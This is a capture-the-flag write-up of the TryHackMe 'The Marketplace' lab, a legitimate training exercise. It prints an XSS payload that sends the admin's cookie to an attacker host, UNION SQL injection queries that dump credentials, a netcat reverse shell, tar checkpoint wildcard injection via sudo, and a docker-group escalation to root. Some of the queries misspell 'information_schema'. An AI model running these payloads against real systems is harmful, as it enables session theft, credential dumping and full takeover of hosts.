---
title: TryHackMe - The Marketplace
layout: post
categories:
- TryHackMe
tag: sqli, xss, docker
image: "/assets/img/marketplace.png"
image_alt: marketplace
---

Can you take over The Marketplace's infrastructure?

This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

Created by [jammy](https://tryhackme.com/p/jammy)

<br>

### 1. What is flag 1? 

Let's do a `nmap` scan.

```
$ nmap -sSCV 10.10.171.214
```     

![nmap](/assets/img/tryhackme/marketplace/nmap.png)

Three ports are open. These are `22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP`

Let's visit the website running on `80/tcp` port.

Here is a homepage.

![home](/assets/img/tryhackme/marketplace/home.png)

There are also `login` and `signup` pages.

![login](/assets/img/tryhackme/marketplace/login.png)

I register as `new:new` on the sign up page.

![signup](/assets/img/tryhackme/marketplace/signup.png)

After that, when I log in, two new pages appear.

![new-pages](/assets/img/tryhackme/marketplace/new-pages.png)

Let's go to the `new-listing` page.

![new-listing](/assets/img/tryhackme/marketplace/new-listing.png)

I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.

The message page is as follows.

![messages](/assets/img/tryhackme/marketplace/messages.png)

I'm checking the `robots.txt` page.

![robots](/assets/img/tryhackme/marketplace/robots.png)

I see the `/admin` page is accessible.

Let's go to the admin page.

![admin-error](/assets/img/tryhackme/marketplace/admin-error.png)

I ran a `gobuster` scan at this point, but nothing useful came up. I tried `SQLi` using `sqlmap` on the login page, but it didn't work either.

Then I decided to try `XSS` on the `New-listing` page.

![xss1](/assets/img/tryhackme/marketplace/xss1.png)

```
$ <script>alert('Mr0Wido')</script>
```

Yes, it did work.

![xss2](/assets/img/tryhackme/marketplace/xss2.png)

There seems to be an `XSS vulnerability`. And maybe with the XSS vulnerability, we can access the cookies of the admin user.

But I still have doubts about how to do this somehow the admin user needs to interact.

I've been wandering around the site a little more and this catches my attention.

![report](/assets/img/tryhackme/marketplace/report.png)

In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.

Let 's do it.

So ı found this GitHub repository for stealing cookies. [Steal Cookies with Reflected XSS](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md). **`(It's don't working.)`**

The page says there is a python script that steals cookies, we need to run it first. [lnxg33k's cookie stealer script](https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py)

Then our payload code is as follows:

```
<script>
alert(document.cookie);
var i=new Image;
i.src="http://<your-ip>:8888/?"+document.cookie;
</script>
```

The python script above didn't work for me and I edited the script again. [Reformed XSS Cookie Stealer Python Script](https://github.com/Mr0Wido/xss-cookie-stealer-python-script)
Let's try.

Let's run the script first.

![script1](/assets/img/tryhackme/marketplace/script1.png)

Now let's `create a New-listing`.

![payload](/assets/img/tryhackme/marketplace/payload.png)

The payload we created.

![report2](/assets/img/tryhackme/marketplace/report2.png)

Now let's get the admin's cookie by reporting the payload we created.

![report1](/assets/img/tryhackme/marketplace/report1.png)

![messages](/assets/img/tryhackme/marketplace/messages.png)

Yes, it worked.

![script2](/assets/img/tryhackme/marketplace/script2.png)

The top token is for my user and the bottom is for the admin user.

Let's go to the site and exchange it for our own token.

For `Firefox`, we will change the cookie part in `Right-click > Inspect > Storage`.

![change](/assets/img/tryhackme/marketplace/change.png)

And when we `refresh the page`, we can now `access the admin`.

![admin](/assets/img/tryhackme/marketplace/admin.png)

As you will see here, there are some users and their ids.

`1:system - 2:michael - 3:jake`

Others are users that I created. I'm working a little messy :grin:

<br>

### 2. What is flag 2? (User.txt)

It's obvious that there is an `SQLi vulnerability` here, but let's verify it anyway.

I click on `Michael` whose id is 2 and write `2-1` instead of user=2 in the URL.

![detect](/assets/img/tryhackme/marketplace/detect.png)

And as you can see it returned to the system user with id 1.

We have confirmed the existence of the SQLi vulnerability.

To find out the number of columns, I proceed as follows, increasing one at a time.

```
? user=0 UNION SELECT 1,2,3,4,5--
```

When I get to the last 5, I get the following error.

![error_column](/assets/img/tryhackme/marketplace/error_column.png)

So we can go up to 4.

Let's get the information from the database.

```
? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
```

![schemata](/assets/img/tryhackme/marketplace/schemata.png)

I continue from the `marketplace`.

```
? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
```

![tables](/assets/img/tryhackme/marketplace/tables.png)

There are two important tables, one is `messages` and the other is `users`.
First I look at the `messages table`.

```
? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
```

![column-messages](/assets/img/tryhackme/marketplace/column-messages.png)

Let's dump the `contents of the messages`.

```
? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
```

![content-messages](/assets/img/tryhackme/marketplace/content-messages.png)

It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the `message includes Jake's ssh password`. Let's keep this information in our pocket now. And let's go to the users table.

```
? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
```

![users](/assets/img/tryhackme/marketplace/users.png)

```
? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
```

![passwords](/assets/img/tryhackme/marketplace/passwords.png)

I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn't work, we continue from here.

```
$ ssh jake@10.10.171.214
```

Yes it worked. We are inside.

![jake](/assets/img/tryhackme/marketplace/jake.png)

Let's get the `user flag`.

![user-flag](/assets/img/tryhackme/marketplace/user-flag.png)

<br>

### 3. What is flag 3? (Root.txt)

Let's try the `sudo -l` command.

And ther it is.

![sduol](/assets/img/tryhackme/marketplace/sduol.png)

We can run `/opt/backups/backup.sh` as Michael. Without requiring a password.

Let's see what's in it.

![backup-sh](/assets/img/tryhackme/marketplace/backup-sh.png)

I couldn't find how to upgrade permissions. When I started researching, I found a way. Let's try.

First I go to [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). And for netcat, I choose:

![nc](/assets/img/tryhackme/marketplace/nc.png)

```
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Now I'm setting up a `netcat` listener on my own machine.

```
nc -nlvp 5555
```

Then I run the following codes in order.

```
$ cd /opt/backups
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.86.168 5555 >/tmp/f" > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
$ chmod 777 backup.tar shell.sh
$ sudo -u michael ./backup.sh
```

![backups](/assets/img/tryhackme/marketplace/backups.png)

And we're in.

![michael-in](/assets/img/tryhackme/marketplace/michael-in.png)

HUH! `999(docker)`. It’s interesting.

I'm looking at [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) to see if I can find anything about docker. 

Let's try this.

![gtf](/assets/img/tryhackme/marketplace/gtf.png)

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

And we are `root`. 

![rootin](/assets/img/tryhackme/marketplace/rootin.png)

Let's get the `root flag`.

![root-flag](/assets/img/tryhackme/marketplace/root-flag.png)

<br>

It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:

<br>
